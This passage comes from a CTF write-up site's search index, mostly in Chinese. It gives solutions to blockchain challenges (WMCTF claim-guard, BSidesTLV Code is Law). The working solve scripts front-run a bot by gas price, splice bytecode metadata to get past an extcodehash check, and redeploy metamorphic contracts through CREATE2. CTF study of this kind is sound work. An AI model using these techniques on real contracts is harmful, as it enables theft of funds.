\"Current block\" , current_bn ) if bn == current_bn : nonce = conn . w3 . eth . get_transaction_count ( account . address ) account . send_transaction ( chall , data = encode_with_signature ( \"registerBlock()\" ), wait_for_receipt = False , gas_limit = 300000 , gas_price = 110000000010 ) account . send_transaction ( chall , data = encode_with_signature ( \"proveWork(bytes32)\" , bytes . fromhex ( f \" { pow : 064x } \" )), nonce = nonce + 1 , wait_for_receipt = False , gas_limit = 300000 , gas_price = 110000000010 ) try : account . send_transaction ( chall , data = encode_with_signature ( \"claimLastWinner(address)\" , account . address ), nonce = nonce + 2 , gas_limit = 300000 ) except Exception as e : print ( e ) lastWinner = conn . cast_call ( chall , \"lastWinner()(address)\" ) print ( \"Player:\" , account . address ) print ( \"lastWinner:\" , lastWinner ) if account . address == lastWinner : p = pwn . remote ( HOST , PORT ) p . sendlineafter ( b \"ticket\" , ticket ) p . sendlineafter ( b \"action?\" , b \"3\" ) p . interactive () Flag \u00b6 WMCTF{is_m3v_this_ea5y} foundry-rs / foundry \u21a9","title":"claim-guard"},{"location":"blockchain/claim_guard/#_1","text":"We got a cheater. nc claim-guard.wm-team.cn 1337 claim_guard.zip","title":"\u9898\u76ee"},{"location":"blockchain/claim_guard/#_2","text":"\u5408\u7ea6 Chall \u5171\u6709\u4e09\u4e2a\u51fd\u6570\uff1a registerBlock() \u3001 proveWork() \u548c claimLastWinner() \u3002\u9898\u76ee\u8981\u6c42 player \uff0c\u5373\u7ed9\u5b9a\u7684 EOA\uff0c\u6210\u4e3a lastWinner \u3002\u9700\u8981 player \u5728\u540c\u4e00\u4e2a\u5757\u5185\u4f9d\u6b21\u8c03\u7528\u4e09\u4e2a\u51fd\u6570\u5e76\u63d0\u4f9b\u6b63\u786e\u7684\u5de5\u4f5c\u8bc1\u660e blockNonce \u8bb0\u5f55\u6bcf\u4e2a\u533a\u5757\u4e2d proveWork() \u6210\u529f\u6267\u884c\u7684\u6b21\u6570\u3002\u53ea\u6709\u7b2c\u4e00\u4e2a\u6210\u529f\u6267\u884c proveWork() \u7684\u8d26\u6237\u80fd\u591f\u8c03\u7528 claimLastWinner() \u6210\u4e3a lastWinner \u9898\u76ee\u73af\u5883\u4e2d\u5305\u542b\u4e00\u4e2a bot\uff0c\u4f1a\u5728\u6bcf\u4e2a\u533a\u5757\u8c03\u7528 registerBlock() \uff0c\u5e76\u76d1\u542c mempool\u3002\u5982\u679c\u51fa\u73b0\u80fd\u591f\u6210\u529f\u6267\u884c proveWork() \u7684\u4ea4\u6613\uff0cbot \u5c06\u4f7f\u7528\u66f4\u9ad8\u7684 gas price \u8bd5\u56fe\u62a2\u8dd1\u5bf9\u5e94\u4ea4\u6613 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 0x27d4563e let sig : [ u8 ; 4 ] = [ 0x27 , 0xd4 , 0x56 , 0x3e ]; // concat sig and pow let mut data = Vec :: with_capacity ( 4 + 32 ); data . extend_from_slice ( & sig ); data . extend_from_slice ( pow . as_slice ()); let bytes = Bytes :: from ( data ); let bn = finalized_block . header . number . unwrap (); let nonce = * self . nonce_map . get ( & bn ). unwrap (); let effective_gas_price = tx . gas_price . or ( tx . max_fee_per_gas ). unwrap_or_default (); let chain_id = self . provider . get_chain_id (). await . unwrap (); let tx_receipt = TransactionRequest { from : Some ( self . sender_addr ), to : Some ( TxKind :: Call ( self . chall_addr )), gas_price : Some ( effective_gas_price * 2 ), gas : Some ( 100_0000 ), input : TransactionInput :: new ( bytes ), chain_id : Some ( chain_id ), nonce : Some ( nonce ), .. Default :: default () }; \u4e0e proveWork() \u4e0d\u540c\uff0cbot \u53d1\u9001\u7684 registerBlock() \u4ea4\u6613\u7684 gas price \u662f\u56fa\u5b9a\u7684 1 2 3 4 5 6 7 8 9 10 11 // register the block let tx_receipt = TransactionRequest { from : Some ( self . sender_addr ), to : Some ( TxKind :: Call ( self . chall_addr )), gas_price : Some ( 110000000000000000 / 100_0000 ), gas : Some ( 100_0000 ), chain_id : Some ( self . provider . get_chain_id (). await . unwrap ()), nonce : Some ( nonce ), input : hex :: decode ( \"0xccac0007\" ). unwrap (). into (), .. Default :: default () }; Anvil \u9ed8\u8ba4\u6309\u7167 gas price \u4ece\u9ad8\u5230\u4f4e\u5bf9\u4ea4\u6613\u8fdb\u884c\u6392\u5e8f 1 \uff0c\u540c\u65f6\u9700\u8981\u4fdd\u8bc1\u6bcf\u4e2a\u8d26\u6237\u7684\u4ea4\u6613\u7684 nonce \u662f\u6709\u6548\u7684\u3002\u5728\u5b9e\u73b0\u4e2d\u91c7\u7528\u5bf9\u72ec\u7acb\u4ea4\u6613\u4ee5 gas price \u548c FIFO (ready ID) \u4f18\u5148\u6392\u5e8f\u7684\u65b9\u5f0f\u3002\u5176\u4e2d\uff0c\u72ec\u7acb\u4ea4\u6613\u4e0d\u4f9d\u8d56\u5176\u5b83\u4ea4\u6613\uff0c\u5373 nonce \u6709\u6548\u53ef\u4ee5\u7acb\u5373\u6267\u884c\u3002\u975e\u72ec\u7acb\u4ea4\u6613\u5c06\u5728\u524d\u7f6e\u4ea4\u6613\u6267\u884c\u540e\u89e3\u9501\u5e76\u52a0\u5165\u5230\u72ec\u7acb\u4ea4\u6613\u96c6\u5408\u4e2d TransactionsIterator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 impl TransactionsIterator { /// Depending on number of satisfied requirements insert given ref /// either to awaiting set or to best set. fn independent_or_awaiting ( & mut self , satisfied : usize , tx_ref : PoolTransactionRef ) { if satisfied >= tx_ref . transaction . requires . len () { // If we have satisfied all deps insert to best self . independent . insert ( tx_ref ); } else { // otherwise we're still awaiting for some deps self . awaiting . insert ( tx_ref . transaction . hash (), ( satisfied , tx_ref )); } } } impl Iterator for TransactionsIterator { type Item = Arc < PoolTransaction > ; fn next ( & mut self ) -> Option < Self :: Item > { loop { let best = self . independent . iter (). next_back () ? . clone (); let best = self . independent . take ( & best ) ? ; let hash = best . transaction . hash (); let ready = if let Some ( ready ) = self . all . get ( & hash ). cloned () { ready } else { continue }; // Insert transactions that just got unlocked. for hash in & ready . unlocks { // first check local awaiting transactions let res = if let Some (( mut satisfied , tx_ref )) = self . awaiting . remove ( hash ) { satisfied += 1 ; Some (( satisfied , tx_ref )) // then get from the pool } else { self . all . get ( hash ) . map ( | next | ( next . requires_offset + 1 , next . transaction . clone ())) }; if let Some (( satisfied , tx_ref )) = res { self . independent_or_awaiting ( satisfied , tx_ref ) } } return Some ( best . transaction ) } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /// transactions that are ready to be included in a block. #[derive(Clone, Debug, Default)] pub struct ReadyTransactions { .. . /// independent transactions that can be included directly and don't require other transactions /// Sorted by their id independent_transactions : BTreeSet < PoolTransactionRef > , } .. . impl Ord for PoolTransactionRef { fn cmp ( & self , other : & Self ) -> Ordering { self . transaction . priority . cmp ( & other . transaction . priority ) . then_with ( || other . id . cmp ( & self . id )) } } \u6839\u636e nonce \u548c\u9898\u76ee\u7ea6\u675f\uff0c proveWork() \u53ea\u80fd\u5728 registerBlock() \u4e4b\u540e\u6267\u884c\uff0c\u56e0\u6b64\u53ea\u9700\u8981 player \u4ee5\u66f4\u9ad8\u7684 gas price \u62a2\u8dd1 bot \u7684 registerBlock() \u4ea4\u6613\u5e76\u5b8c\u6210 proveWork() \u5373\u53ef \u53e6\u5916\uff0c\u7531\u4e8e\u533a\u5757\u7684\u4f7f\u7528\u7387\u51e0\u4e4e\u603b\u662f\u4e0d\u5230 50%\uff0c\u56e0\u6b64 base fee \u4f1a\u9010\u533a\u5757\u51cf\u5c11\uff0c\u53ef\u4ee5\u4ee5\u6b64\u6765\u533a\u5206\u6a21\u62df\u6267\u884c\u548c\u5b9e\u9645\u6267\u884c\uff0c\u8bbe\u7f6e\u5c0f\u4e8e\u5f53\u524d base fee \u800c\u5927\u4e8e\u4e0b\u4e00\u533a\u5757 base fee \u7684 gas price\uff0c\u4ece\u800c\u963b\u6b62 bot \u53d1\u9001 proveWork() \u4ea4\u6613","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/claim_guard/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from web3 import Web3 from cheb3 import Connection from cheb3.utils import encode_with_signature import time , pwn ticket = b \"<ticket>\" HOST = \"claim-guard.wm-team.cn\" PORT = 1337 p = pwn . remote ( HOST , PORT ) p . sendlineafter ( b \"ticket\" , ticket ) p . sendlineafter ( b \"action?\" , b \"1\" ) p . recvuntil ( b \"rpc endpoints\" ) rpc = p . recvline_contains ( b \"-\" ) . decode () . split ( \" \" )[ - 1 ] conn = Connection ( rpc ) priv = p . recvline_contains ( b \"private key\" ) . decode () . split ( \" \" )[ - 1 ] account = conn . account ( priv ) setup = p . recvline_contains ( b \"contract:\" ) . decode () . split ( \" \" )[ - 1 ] p . close () chall = conn . cast_call ( setup , \"chall()(address)\" ) pow = 0 bn = conn . w3 . eth . get_block_number () + 2 while True : h = Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ pow , bn ]) . hex () if int ( h , 16 ) >> 0xf0 == 0 : print ( \"Pow:\" , pow ) break pow += 1 print ( \"Waiting for block\" , bn ) current_bn = conn . w3 . eth . get_block_number () + 1 while bn > current_bn : time . sleep ( 0.5 ) current_bn = conn . w3 . eth . get_block_number () + 1 print ( \"Current block\" , current_bn ) if bn == current_bn : nonce = conn . w3 . eth . get_transaction_count ( account . address ) account . send_transaction ( chall , data = encode_with_signature ( \"registerBlock()\" ), wait_for_receipt = False , gas_limit = 300000 , gas_price = 110000000010 ) account . send_transaction ( chall , data = encode_with_signature ( \"proveWork(bytes32)\" , bytes . fromhex ( f \" { pow : 064x } \" )), nonce = nonce + 1 , wait_for_receipt = False , gas_limit = 300000 , gas_price = 110000000010 ) try : account . send_transaction ( chall , data = encode_with_signature ( \"claimLastWinner(address)\" , account . address ), nonce = nonce + 2 , gas_limit = 300000 ) except Exception as e : print ( e ) lastWinner = conn . cast_call ( chall , \"lastWinner()(address)\" ) print ( \"Player:\" , account . address ) print ( \"lastWinner:\" , lastWinner ) if account . address == lastWinner : p = pwn . remote ( HOST , PORT ) p . sendlineafter ( b \"ticket\" , ticket ) p . sendlineafter ( b \"action?\" , b \"3\" ) p . interactive ()","title":"\u89e3\u9898\u811a\u672c"},{"location":"blockchain/claim_guard/#flag","text":"WMCTF{is_m3v_this_ea5y} foundry-rs / foundry \u21a9","title":"Flag"},{"location":"blockchain/code_is_law/","tags":["smart contract","hardhat"],"text":"#smart contract #hardhat .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Download the zip file and follow the instructions in the README.md file to solve the solidity challenge. code-is-law-1.zip code-is-law-2.zip OnlyICanHazToken.sol 1 2 3 4 5 6 7 8 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; contract OnlyICanHazToken { function bye () public { selfdestruct ( payable ( msg . sender )); } } index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { expect } from \"chai\" ; import { ethers } from \"hardhat\" ; import { ChallengeToken } from \"../typechain\" ; // This \"Challenge Setup\" block must be left as-is describe ( \"Challenge Setup\" , function () { it ( \"Should deploy ChallengeToken\" , async function () { const ChallengeTokenFactory = await ethers . getContractFactory ( \"ChallengeToken\" , ( await ethers . getSigners ()). pop ()); const challengeToken = await ChallengeTokenFactory . deploy (); await challengeToken . deployed (); }); }); // Try to solve the challenge below this line // Run `npx hardhat ctf-try` to test your solution locally // Run `npx hardhat ctf-try --submit` to submit your solution to the remote CTF node and get the real flag describe ( \"Solve Challenge\" , function () { let challengeToken : ChallengeToken ; it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); }); Code is Law 1 \u00b6 ChallengeToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"hardhat/console.sol\" ; contract ChallengeToken is ERC20 { bytes32 private onlyICanHazTokenContractCodeHash = 0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3 ; constructor () ERC20 ( \"ChallengeToken\" , \"BSIDES2022\" ) {} function did_i_win () public view returns ( string memory ) { if ( balanceOf ( msg . sender ) == 0 ) { revert ( \"you shall not pass\" ); } return \"BSidesTLV2022{PLACEHOLDER}\" ; } function can_i_haz_token ( address receiver ) public { require ( receiver == calculateAddressOfTheFirstContractDeployedBy ( tx . origin ), \"receiver is ineligible for a token because they are not the first contract deployed by the EOA who initiated this transaction\" ); require ( getContractCodeHash ( receiver ) == onlyICanHazTokenContractCodeHash , \"receiver is ineligible for a token because their codehash does not match the specific contract codehash required\" ); if ( balanceOf ( receiver ) == 0 ) { _mint ( receiver , 1 ); } } function getContractCodeHash ( address contractAddress ) private view returns ( bytes32 callerContractCodeHash ) { assembly { callerContractCodeHash := extcodehash ( contractAddress ) } } // Copied from https://ethereum.stackexchange.com/a/87840 function calculateAddressOfTheFirstContractDeployedBy ( address deployer ) private pure returns ( address _address ) { bytes32 hash = keccak256 ( abi . encodePacked ( bytes1 ( 0xd6 ), bytes1 ( 0x94 ), deployer , bytes1 ( 0x80 )) ); assembly { mstore ( 0 , hash ) _address := mload ( 0 ) } } } Code is Law 2 \u00b6 ChallengeToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"hardhat/console.sol\" ; contract ChallengeToken is ERC20 { bytes32 private onlyICanHazTokenContractCodeHash = 0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3 ; constructor () ERC20 ( \"ChallengeToken\" , \"BSIDES2022\" ) {} function did_i_win () public view returns ( string memory ) { if ( balanceOf ( msg . sender ) == 0 ) { revert ( \"you shall not pass\" ); } return \"BSidesTLV2022{PLACEHOLDER}\" ; } function can_i_haz_token ( address receiver ) public { require ( getContractCodeHash ( receiver ) == onlyICanHazTokenContractCodeHash , \"receiver is ineligible for a token because their codehash does not match the specific contract codehash required\" ); if ( balanceOf ( receiver ) == 0 ) { _mint ( receiver , 1 ); } } function getContractCodeHash ( address contractAddress ) private view returns ( bytes32 callerContractCodeHash ) { assembly { callerContractCodeHash := extcodehash ( contractAddress ) } } function approve ( address spender , uint256 amount ) public override returns ( bool ) { return false ; } } \u89e3\u9898\u601d\u8def English ver. \u00b6 \u5f53 ChallengeToken.did_i_win() \u7684 msg.sender \u6240\u5728\u5730\u5740\u6301\u6709 token \u65f6\u5c31\u80fd\u83b7\u5f97 flag \u9996\u5148\u5206\u6790 Code is Law 1 \u7684 ChallengeToken \u5408\u7ea6 ChallengeToken \u901a\u8fc7\u51fd\u6570 can_i_haz_token \u53d1\u653e token \uff0c\u4f46\u53ea\u6709\u5408\u7ea6 receiver \u5728 tx.origin \u521d\u6b21\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\u4e0a\uff0c\u4e14\u5408\u7ea6\u4ee3\u7801\u7684\u54c8\u5e0c\u503c\u4e0e onlyICanHazTokenContractCodeHash \u76f8\u7b49\u65f6\u624d\u80fd\u83b7\u5f97 \u90a3\u4e48\uff0c\u5148\u8ba9\u5408\u7ea6 OnlyICanHazToken \u83b7\u5f97 token \u518d\u8f6c\u79fb\u5462\uff1f\u4f46 selfdestruct(payable(msg.sender)) \u53ea\u80fd\u8f6c\u79fb\u4ee5\u592a\u5e01\uff0c\u65e0\u6cd5\u8f6c\u79fb token \u518d\u56de\u5934\u770b\u770b ChallengeToken \u7684 getContractCodeHash \u548c calculateAddressOfTheFirstContractDeployedBy \u4f3c\u4e4e\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c ERC20 \u5c31\u66f4\u4e0d\u53ef\u80fd\u4e86 uwu \u6700\u540e\u628a\u6ce8\u610f\u529b\u8f6c\u79fb\u5230\u4e86 hardhat \u4e0a\uff0c\u53d1\u73b0\u4e86\u80fd\u4fee\u6539\u5408\u7ea6\u5b58\u50a8\u7684 hardhat_setStorageAt 1 \uff08\u662f\u795e (\u2565\u03c9\u2565)\uff09\uff0c\u7ed3\u5408\u5408\u7ea6\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u7f6e\u3001\u65b9\u5f0f\u76f4\u63a5\u4fee\u6539\u4f59\u989d\u5c31\u597d\u4e86\uff01 1 2 3 4 5 6 7 8 9 10 it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); let [ player ] = await ethers . getSigners (); let playerHash = await ethers . utils . solidityKeccak256 ([ \"uint256\" , \"uint\" ], [ player . address , 0 ]); await ethers . provider . send ( \"hardhat_setStorageAt\" , [ challengeToken . address , playerHash , ethers . utils . hexZeroPad ( ethers . utils . hexlify ( 1 ), 32 )]); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); ChallengeToken \u7ee7\u627f\u81ea ERC20 \uff0c\u53d8\u91cf _balances \u7528\u4e8e\u5b58\u50a8\u5404\u4e2a\u8d26\u6237\u5730\u5740\u5bf9\u5e94\u7684\u4f59\u989d _balances \u4e3a mapping \u7c7b\u578b\uff0c\u5360\u7528 slot 0 \uff0c\u90a3\u4e48\u5730\u5740 A \u7684\u4f59\u989d\u5b58\u50a8\u4f4d\u7f6e\u5728 keccak256(A | 0) \uff0c | \u8868\u793a\u8fde\u63a5 Code is Law 2 \u4e0e Code is Law 1 \u76f8\u6bd4\uff0c\u53ea\u4fee\u6539\u4e86 ChallengeToken \u53d1\u653e token \u7684\u89c4\u5219\u5e76\u7981\u7528\u4e86 approve \uff0c\u56e0\u800c\u4fee\u6539\u5b58\u50a8\u7684\u65b9\u6cd5\u4ecd\u7136\u9002\u7528 =\uff09 \u770b\u4e86\u5b98\u65b9 WP 2 3 \u518d\u6765\u8865\u5145\u4e00\u4e0b =\u03c9= Code is Law 1 \u00b6 \u5173\u952e\u70b9\u5728\u4e8e\u6784\u9020\u51fd\u6570\u4e0d\u662f\u5408\u7ea6\u4ee3\u7801\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 OnlyICanHazToken \u7684\u6784\u9020\u51fd\u6570\u4e2d approve \u6269\u5c55\u5408\u7ea6 OnlyICanHazToken 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"./ChallengeToken.sol\" ; contract ExtOnlyICanHazToken { constructor () { ChallengeToken ( 0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f ). approve ( msg . sender , 1 ); } function bye () public { selfdestruct ( payable ( msg . sender )); } } \u4e0d\u8fc7\uff0c\u76f4\u63a5\u4f7f\u7528\u5408\u7ea6 ExtOnlyICanHazToken \u4ecd\u7136\u4f1a\u5f97\u5230\u62a5\u9519 receiver is ineligible for a token because their codehash does not match the specific contract codehash required :( \u6253\u5370\u5408\u7ea6 OnlyICanHazToken \u548c ExtOnlyICanHazToken \u7684\u5b57\u8282\u7801\u8fdb\u884c\u5bf9\u6bd4 1 2 3 4 console . log (( await ethers . getContractFactory ( \"OnlyICanHazToken\" )). bytecode ); // 0x6080604052348015600f57600080fd5b5060848061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212208288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff64736f6c63430008040033 console . log (( await ethers . getContractFactory ( \"ExtOnlyICanHazToken\" )). bytecode ); // 0x608060405234801561001057600080fd5b507373511669fd4de447fed18bb79bafeac93ab7f31f73ffffffffffffffffffffffffffffffffffffffff1663095ea7b33360016040518363ffffffff1660e01b8152600401610061929190610115565b602060405180830381600087803b15801561007b57600080fd5b505af115801561008f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100b391906100ce565b506101af565b6000815190506100c881610198565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b6101008161013e565b82525050565b61010f81610186565b82525050565b600060408201905061012a60008301856100f7565b6101376020830184610106565b9392505050565b60006101498261015c565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101918261017c565b9050919050565b6101a181610150565b81146101ac57600080fd5b50565b6084806101bd6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb2964736f6c63430008040033 \u5b57\u8282\u7801 39 \u5c06\u5408\u7ea6\u4ee3\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u6bd4\u8f83\u4e24\u4efd\u5408\u7ea6\u4ee3\u7801\u6700\u540e\u4e00\u4e2a 39 \u540e\u7684\u5b57\u8282\u7801\uff0c\u53d1\u73b0\u6709\u4e00\u5c0f\u6bb5\u5dee\u5f02 1 2 6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_8288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff_64736f6c63430008040033 6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb29_64736f6c63430008040033 \u7f16\u8bd1\u5668\u9ed8\u8ba4\u4f1a\u5c06 metadata \u6587\u4ef6\u7684 IPFS \u54c8\u5e0c\u6dfb\u52a0\u5230\u5b57\u8282\u7801\u7684\u672b\u5c3e 4 \uff0c v0.8.0 \u7248\u672c\u7684\u7f16\u8bd1\u5668\u901a\u5e38\u6309\u5982\u4e0b\u683c\u5f0f\u6dfb\u52a0 1 2 3 4 0xa2 0x64 'ipfs'(69706673) 0x58 0x22 <34 bytes IPFS hash> 0x64 'solc'(736f6c63) 0x43 <3 byte version encoding> 0x00 0x33 \u4e3a\u4e86\u901a\u8fc7 extcodehash \u7684\u68c0\u67e5\uff0c\u53ef\u4ee5\u4f7f\u7528 OnlyICanHazToken \u8986\u76d6 ExtOnlyICanHazToken IPFS \u54c8\u5e0c\u90e8\u5206\u7684\u5b57\u8282\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 it ( \"Should return the winning flag\" , async function () { let onlyICanHazTokenFactory = await ethers . getContractFactory ( 'OnlyICanHazToken' ); let extOnlyICanHazTokenFactory = await ethers . getContractFactory ( 'ExtOnlyICanHazToken' ); let [ player ] = await ethers . getSigners (); const ExtOnlyICanHazTokenFactory = new ethers . ContractFactory ( onlyICanHazTokenFactory . interface , extOnlyICanHazTokenFactory . bytecode . substring ( 0 , extOnlyICanHazTokenFactory . bytecode . length - 100 ) + onlyICanHazTokenFactory . bytecode . substring ( onlyICanHazTokenFactory . bytecode . length - 100 ), player ); let extOnlyICanHazToken = await ExtOnlyICanHazTokenFactory . deploy (); await extOnlyICanHazToken . deployed (); challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); await challengeToken . can_i_haz_token ( extOnlyICanHazToken . address ); await challengeToken . transferFrom ( extOnlyICanHazToken . address , player . address , 1 ); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); Code is Law 2 \u00b6 approve \u88ab\u7981\u7528\u4e86\uff0c\u4f46\u53d1\u653e token \u7684\u89c4\u5219\u6709\u6240\u5bbd\u9650\uff0c\u4e0d\u518d\u9700\u8981\u662f tx.origin \u521d\u6b21\u90e8\u7f72\u7684\u5408\u7ea6 \u4e0d\u8fc7 Code is Law 1 \u4e2d calculateAddressOfTheFirstContractDeployedBy \u4f9d\u636e\u7684\u662f CREATE \u64cd\u4f5c\u7801\u7684\u5730\u5740\u8ba1\u7b97\u89c4\u5219\uff0c\u5373\u65b0\u5408\u7ea6\u7684\u5730\u5740\u4e0e\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\u548c\u7531\u521b\u5efa\u8005\u53d1\u8d77\u7684\u4ea4\u6613\u7684\u6570\u91cf\u6709\u5173\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5408\u7ea6\u8fd8\u53ef\u4ee5\u901a\u8fc7 CREATE2 \u64cd\u4f5c\u7801\u521b\u5efa\uff0c\u6b64\u65f6\u7684\u5408\u7ea6\u5730\u5740\u4e0e\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\u3001\u53c2\u6570 salt \u548c\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u6709\u5173\uff0c\u82e5\u4fdd\u6301\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u4e0d\u53d8\uff0c\u4e14\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u8fd0\u884c\u65f6\u5b57\u8282\u7801\u53ef\u63a7\uff0c\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u5730\u5740\u4e0a\u53cd\u590d\u90e8\u7f72\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6 \u63a5\u4e0b\u6765\u601d\u8def\u5c31\u5f88\u6e05\u6670\u5566\uff0c\u5148\u5229\u7528 CREATE2 \u90e8\u7f72 OnlyICanHazToken \u5e76\u5728\u53d6\u5f97 token \u540e selfdestruct \uff0c\u518d\u5728\u76f8\u540c\u5730\u5740\u4e0a\u90e8\u7f72\u65b0\u7684\u5408\u7ea6\u6765\u8f6c\u79fb token \u5408\u7ea6 Deployer \u8d1f\u8d23\u90e8\u7f72\u6307\u5b9a\u5408\u7ea6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; contract Deployer { mapping ( address => address ) _implementations ; address public deployAddr ; // will be called by the metamorphic Contract function getImplementation () external view returns ( address implementation ) { return _implementations [ msg . sender ]; } function _getMetamorphicContractAddress ( uint256 salt , bytes memory metamorphicCode ) internal view returns ( address ) { // determine the address of the metamorphic contract. return address ( uint160 ( uint256 ( keccak256 ( abi . encodePacked ( hex \"ff\" , address ( this ), salt , keccak256 ( abi . encodePacked ( metamorphicCode ))))))); } function deploy ( bytes calldata bytecode , uint256 salt ) public { bytes memory implInitCode = bytecode ; // assign the initialization code for the metamorphic contract. bytes memory metamorphicCode = ( hex \"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3\" // here 3c (extcodecopy) is used, not 39 (codecopy) ); // declare a variable for the address of the implementation contract. address implementationContract ; // load implementation init code and length, then deploy via CREATE. assembly { implementationContract := create ( 0 , add ( 0x20 , implInitCode ), mload ( implInitCode )) } address metamorphicContractAddress = _getMetamorphicContractAddress ( salt , metamorphicCode ); // first we deploy the code we want to deploy on a separate address // store the implementation to be retrieved by the metamorphic contract. _implementations [ metamorphicContractAddress ] = implementationContract ; address addr ; assembly { addr := create2 ( 0 , // send 0 wei add ( 0x20 , metamorphicCode ), // load initialization code. mload ( metamorphicCode ), // load init code's length. salt ) } deployAddr = addr ; } } \u5408\u7ea6 Withdrawer \u7528\u4e8e\u8f6c\u79fb token \uff0c\u5728 OnlyICanHazToken \u5b9e\u4f8b\u81ea\u6bc1\u540e\u7531 Deployer \u90e8\u7f72\u5230\u539f OnlyICanHazToken \u5b9e\u4f8b\u6240\u5728\u7684\u5730\u5740 1 2 3 4 5 6 7 8 9 10 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"./ChallengeToken.sol\" ; contract Withdrawer { function withdraw () public { ChallengeToken ( 0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f ). transfer ( msg . sender , 1 ); } } \u5408\u7ea6\u4ea4\u4e92\u8fc7\u7a0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , 